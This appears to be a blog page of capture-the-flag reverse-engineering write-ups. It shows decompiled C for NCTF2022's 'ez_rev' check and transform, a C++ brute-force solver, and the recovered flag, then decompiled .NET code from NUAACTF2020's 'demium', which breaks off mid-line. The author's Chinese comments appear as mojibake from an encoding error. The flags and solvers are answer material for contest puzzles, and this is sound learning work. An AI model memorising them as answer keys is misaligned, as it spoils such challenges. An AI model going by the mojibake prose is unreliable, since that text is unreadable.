<h1 id="NCTF2022"><a href="#NCTF2022" class="headerlink" title="NCTF2022"></a>NCTF2022</h1><h2 id="ez-rev"><a href="#ez-rev" class="headerlink" title="ez_rev"></a>ez_rev</h2><p>å¹³æ—¶å¾—å¤šå†™è„šæœ¬ è¿˜æœ‰ç«¯åºé—®é¢˜å•Šï¼ï¼ï¼ å†™ä¸ªä»£ç å†™äº†å¥½ä¹… éš¾ç»·â€¦<br>è¿›IDA<br>main</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *v4; <span class="comment">// rbx</span></span><br><span class="line">  __int128 *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;dword_55EC99F560A0);</span><br><span class="line">  <span class="keyword">if</span> ( dword_55EC99F560A0 == <span class="string">&#x27;FTCN&#x27;</span> &amp;&amp; byte_55EC99F560A4 == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; byte_55EC99F560C9 == <span class="string">&#x27;&#125;&#x27;</span> &amp;&amp; !byte_55EC99F560CA )</span><br><span class="line">  &#123;                                             <span class="comment">// len=42</span></span><br><span class="line">    v4 = (<span class="type">unsigned</span> __int8 *)&amp;unk_55EC99F560A5;  <span class="comment">// input å»å¤´</span></span><br><span class="line">    v5 = &amp;xmmword_55EC99F560E0;                 <span class="comment">// åˆå§‹ä¸º0</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v4;</span><br><span class="line">      v4 += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">sub_55EC99F53290</span>(v6, &amp;asc_55EC99F56060, v5);<span class="comment">// v6 ~ v5  å››ä¸ªå­—ç¬¦ä¸€æ¬¡å˜æ¢ æ¯æ¬¡å˜æ¢ä¼šæ”¹å˜v5çš„å€¼ ç„¶ååé¢checkçš„xmmwordå°±æ˜¯v5å€¼çš„æ‹¼æ¥</span></span><br><span class="line">      v5 = (__int128 *)(v7 + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 != (<span class="type">unsigned</span> __int8 *)((<span class="type">char</span> *)&amp;unk_55EC99F560A5 + <span class="number">36</span>) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( xmmword_55EC99F560E0 == xmmword_55EC99F56020</span><br><span class="line">    &amp;&amp; xmmword_55EC99F560F0 == xmmword_55EC99F56030</span><br><span class="line">    &amp;&amp; dword_55EC99F56040 == dword_55EC99F56100 )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†å‡½æ•°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55EC99F53290</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">char</span> *a2, _BYTE *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// r8</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">unsigned</span> __int8)a2[<span class="number">3</span>];                  <span class="comment">// v3=0x75</span></span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">  v5 = *a2;                                     <span class="comment">// v5=0x7E</span></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v7 = a1[<span class="number">1</span>];</span><br><span class="line">  v8 = (<span class="type">unsigned</span> __int8)a2[<span class="number">1</span>];                  <span class="comment">// v8=0x1F</span></span><br><span class="line">  v9 = a1[<span class="number">2</span>];</span><br><span class="line">  v10 = (v6 + v4) * (*a2 + v3);                 <span class="comment">// a2[0]=0x7E</span></span><br><span class="line">  v11 = a2[<span class="number">2</span>];</span><br><span class="line">  v12 = v3 * (v6 + v7);</span><br><span class="line">  v13 = (v3 + v11) * (v7 - v4);</span><br><span class="line">  v14 = v4 * (v11 - v5);</span><br><span class="line">  v15 = v5 * (v9 + v4);</span><br><span class="line">  *a3 = v14 + v10 + v13 - v12;</span><br><span class="line">  a3[<span class="number">2</span>] = v15 + v14;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(v6 * (v8 - v3));</span><br><span class="line">  a3[<span class="number">1</span>] = v6 * (v8 - v3) + v12;</span><br><span class="line">  a3[<span class="number">3</span>] = v6 * (v8 - v3) + (v8 + v5) * (v9 - v6) + v10 - v15;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ¨è°ƒå‘ç°é€»è¾‘å°±æ˜¯å–å››ä¸ªå­—ç¬¦ä¸€ç»„è¿›è¡ŒåŠ å¯†å¤„ç† ç›´æ¥æšä¸¾çˆ†ç ´</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> __int8 *a1,<span class="type">unsigned</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">	v3=<span class="number">0x75</span>;</span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">	v5=<span class="number">0x7E</span>;</span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v7 = a1[<span class="number">1</span>];</span><br><span class="line">	v8=<span class="number">0x1F</span>;</span><br><span class="line">  v9 = a1[<span class="number">2</span>];</span><br><span class="line">  v10 = (v6 + v4) * (<span class="number">0x7E</span> + <span class="number">0x75</span>);                 <span class="comment">// a2[0]=0x7E</span></span><br><span class="line">  v11 = <span class="number">0x19</span>;</span><br><span class="line">  v12 = <span class="number">0x75</span> * (v6 + v7);</span><br><span class="line">  v13 = (<span class="number">0x75</span> + <span class="number">0x19</span>) * (v7 - v4);</span><br><span class="line">  v14 = v4 * (<span class="number">0x19</span> - <span class="number">0x7E</span>);</span><br><span class="line">  v15 = <span class="number">0x7E</span> * (v9 + v4);</span><br><span class="line">  a3[<span class="number">0</span>] = v14 + v10 + v13 - v12;</span><br><span class="line">  a3[<span class="number">2</span>] = v15 + v14;</span><br><span class="line">  a3[<span class="number">1</span>] = v6 * (<span class="number">0x1F</span> - <span class="number">0X75</span>) + v12;</span><br><span class="line">  a3[<span class="number">3</span>] = v6 * (<span class="number">0x1F</span> - <span class="number">0x75</span>) + (<span class="number">0x1f</span> + <span class="number">0x7e</span>) * (v9 - v6) + v10 - v15;</span><br><span class="line">	a3[<span class="number">0</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">	a3[<span class="number">1</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">	a3[<span class="number">2</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">	a3[<span class="number">3</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a1[<span class="number">4</span>],a3[<span class="number">4</span>];</span><br><span class="line">	<span class="type">int</span> c1[]=&#123;<span class="number">122</span>,<span class="number">173</span>,<span class="number">239</span>,<span class="number">153</span>,<span class="number">5</span>,<span class="number">109</span>,<span class="number">118</span>,<span class="number">172</span>,<span class="number">117</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">int</span> c2[]=&#123;</span><br><span class="line">		<span class="number">8</span>,<span class="number">175</span>,<span class="number">216</span>,<span class="number">235</span>,<span class="number">67</span>,<span class="number">10</span>,<span class="number">100</span>,<span class="number">242</span>,<span class="number">117</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">int</span> c3[]=&#123;</span><br><span class="line">		<span class="number">46</span>,<span class="number">130</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">159</span>,<span class="number">127</span>,<span class="number">47</span>,<span class="number">201</span>,<span class="number">181</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">int</span> c4[]=&#123;</span><br><span class="line">		<span class="number">186</span>,<span class="number">140</span>,<span class="number">248</span>,<span class="number">22</span>,<span class="number">200</span>,<span class="number">190</span>,<span class="number">169</span>,<span class="number">71</span>,<span class="number">51</span></span><br><span class="line">	&#125;;</span><br><span class="line">	string flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> _=<span class="number">0</span>;_&lt;<span class="number">9</span>;_++)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">32</span>;a&lt;=<span class="number">128</span>;a++)</span><br><span class="line">		&#123;</span><br><span class="line"><span class="comment">//		cout&lt;&lt;a&lt;&lt;&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> b=<span class="number">32</span>;b&lt;=<span class="number">128</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> c=<span class="number">32</span>;c&lt;=<span class="number">128</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">32</span>;d&lt;=<span class="number">128</span>;d++)</span><br><span class="line">				&#123;</span><br><span class="line">					a1[<span class="number">0</span>]=a,a1[<span class="number">1</span>]=b,a1[<span class="number">2</span>]=c,a1[<span class="number">3</span>]=d;</span><br><span class="line">					<span class="built_in">enc</span>(a1,a3);</span><br><span class="line">					<span class="keyword">if</span>(a3[<span class="number">0</span>]==c1[_]&amp;&amp;a3[<span class="number">1</span>]==c2[_]&amp;&amp;a3[<span class="number">2</span>]==c3[_]&amp;&amp;a3[<span class="number">3</span>]==c4[_])&#123;</span><br><span class="line">						cout&lt;&lt;<span class="built_in">char</span>(a)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(b)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(c)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(d)&lt;&lt;<span class="string">&quot;&quot;</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>flag</strong> : NCTF{f6dffab6-173f-4bb1-a973-62f3f8254eba}</p>
<h1 id="NUAACTF2020"><a href="#NUAACTF2020" class="headerlink" title="NUAACTF2020"></a>NUAACTF2020</h1><h2 id="demium"><a href="#demium" class="headerlink" title="demium"></a>demium</h2><p>32ä½.NET<br>dnspyæ‰¾åŠå¤©æ‰¾ä¸åˆ°å…³é”®å‡½æ•° æç€å°±æ²¡æ‰¾åˆ°å…¥å£ç‚¹â€¦<br>çç¿»å‡½æ•°åˆ—è¡¨ ç¿»åˆ°ä¸ª 	internal unsafe static void EncryptStr(char* input)</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">unsafe</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EncryptStr</span>(<span class="params"><span class="built_in">char</span>* input</span>)</span></span><br><span class="line">    &#123; <span class="comment">// H[]ä½œä¸ºç´¢å¼•  Wä¸­çš„ä¸‹æ ‡å–å¾—æ˜¯ H[xxx]*2  åˆšå¥½H:0~69      W: 0~136</span></span><br><span class="line">        $ArrayType$$$BY0EF@H $ArrayType$$$BY0EF@H = <span class="number">45</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">4</span>) = <span class="number">15</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">8</span>) = <span class="number">67</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">12</span>) = <span class="number">61</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">16</span>) = <span class="number">8</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">20</span>) = <span class="number">68</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">24</span>) = <span class="number">9</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">28</span>) = <span class="number">39</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">32</span>) = <span class="number">60</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">36</span>) = <span class="number">2</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">40</span>) = <span class="number">56</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">44</span>) = <span class="number">63</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">48</span>) = <span class="number">36</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">52</span>) = <span class="number">38</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">56</span>) = <span class="number">28</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">60</span>) = <span class="number">29</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">64</span>) = <span class="number">57</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">68</span>) = <span class="number">50</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">72</span>) = <span class="number">1</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">76</span>) = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">80</span>) = <span class="number">51</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">84</span>) = <span class="number">52</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">88</span>) = <span class="number">17</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">92</span>) = <span class="number">3</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">96</span>) = <span class="number">26</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">100</span>) = <span class="number">21</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">104</span>) = <span class="number">40</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">108</span>) = <span class="number">11</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">112</span>) = <span class="number">37</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">116</span>) = <span class="number">16</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">120</span>) = <span class="number">31</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">124</span>) = <span class="number">22</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">128</span>) = <span class="number">32</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">132</span>) = <span class="number">19</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">136</span>) = <span class="number">33</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">140</span>) = <span class="number">4</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">144</span>) = <span class="number">66</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">148</span>) = <span class="number">53</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">152</span>) = <span class="number">65</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">156</span>) = <span class="number">25</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">160</span>) = <span class="number">41</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">164</span>) = <span class="number">44</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">168</span>) = <span class="number">20</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">172</span>) = <span class="number">7</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">176</span>) = <span class="number">12</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">180</span>) = <span class="number">18</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">184</span>) = <span class="number">64</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">188</span>) = <span class="number">30</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">192</span>) = <span class="number">49</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">196</span>) = <span class="number">58</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">200</span>) = <span class="number">10</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">204</span>) = <span class="number">62</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">208</span>) = <span class="number">24</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">212</span>) = <span class="number">43</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">216</span>) = <span class="number">48</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">220</span>) = <span class="number">46</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">224</span>) = <span class="number">6</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">228</span>) = <span class="number">47</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">232</span>) = <span class="number">13</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">236</span>) = <span class="number">35</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">240</span>) = <span class="number">42</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">244</span>) = <span class="number">14</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">248</span>) = <span class="number">59</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">252</span>) = <span class="number">23</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">256</span>) = <span class="number">27</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">260</span>) = <span class="number">34</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">264</span>) = <span class="number">54</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">268</span>) = <span class="number">55</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@H + <span class="number">272</span>) = <span class="number">5</span>;</span><br><span class="line">        $ArrayType$$$BY0EF@_W $ArrayType$$$BY0EF@_W = <span class="number">65</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">2</span>) = <span class="number">66</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">4</span>) = <span class="number">67</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">6</span>) = <span class="number">68</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">8</span>) = <span class="number">69</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">10</span>) = <span class="number">70</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">12</span>) = <span class="number">71</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">14</span>) = <span class="number">72</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">16</span>) = <span class="number">73</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">18</span>) = <span class="number">74</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">20</span>) = <span class="number">75</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">22</span>) = <span class="number">76</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">24</span>) = <span class="number">77</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">26</span>) = <span class="number">78</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">28</span>) = <span class="number">79</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">30</span>) = <span class="number">80</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">32</span>) = <span class="number">81</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">34</span>) = <span class="number">82</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">36</span>) = <span class="number">83</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">38</span>) = <span class="number">84</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">40</span>) = <span class="number">85</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">42</span>) = <span class="number">86</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">44</span>) = <span class="number">87</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">46</span>) = <span class="number">88</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">48</span>) = <span class="number">89</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">50</span>) = <span class="number">90</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">52</span>) = <span class="number">97</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">54</span>) = <span class="number">98</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">56</span>) = <span class="number">99</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">58</span>) = <span class="number">100</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">60</span>) = <span class="number">101</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">62</span>) = <span class="number">102</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">64</span>) = <span class="number">103</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">66</span>) = <span class="number">104</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">68</span>) = <span class="number">105</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">70</span>) = <span class="number">106</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">72</span>) = <span class="number">107</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">74</span>) = <span class="number">108</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">76</span>) = <span class="number">109</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">78</span>) = <span class="number">110</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">80</span>) = <span class="number">111</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">82</span>) = <span class="number">112</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">84</span>) = <span class="number">113</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">86</span>) = <span class="number">114</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">88</span>) = <span class="number">115</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">90</span>) = <span class="number">116</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">92</span>) = <span class="number">117</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">94</span>) = <span class="number">118</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> $ArrayType$$$BY0EF@_W + <span class="number">96</span>) = <span class="number">119</span>;</span><br><span class="line">        *(<span class="keyword">ref</span> 